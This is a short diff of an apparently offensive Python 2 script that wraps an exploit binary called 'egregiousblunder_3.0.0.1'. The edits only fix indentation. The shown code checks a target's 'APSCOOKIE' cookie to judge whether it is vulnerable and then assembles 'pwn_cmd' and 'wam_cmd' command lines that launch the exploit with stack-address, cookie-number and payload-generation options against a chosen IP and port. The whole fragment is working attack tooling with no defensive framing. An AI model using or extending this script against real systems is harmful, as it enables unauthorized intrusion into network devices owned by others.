@@ -78,11 +78,11 @@ if __name__ == '__main__':
         else:
             for i in req2.cookies.keys():
                 if i.startswith('APSCOOKIE') and req2.cookies.get(i) == '0&0':
-                print "[+]", url, "use the option \"--cookienum", i[9:], "\"and use \"-v 4nc\""
-                cookienum = i[9:]
+                    print "[+]", url, "use the option \"--cookienum", i[9:], "\"and use \"-v 4nc\""
+                    cookienum = i[9:]
             	else:
-            		print "[-] Specific Cookie Not Found,this target may be not Vulnerbale."
-            		os._exit(0)
+            	    print "[-] Specific Cookie Not Found,this target may be not Vulnerbale."
+            	    os._exit(0)
                 pwn_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --stack %s --nopen --gen 4nc --cookienum %s" % (
                     ip, port, ssloption, stackadress, cookienum)
                 wam_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --wam 10" % (
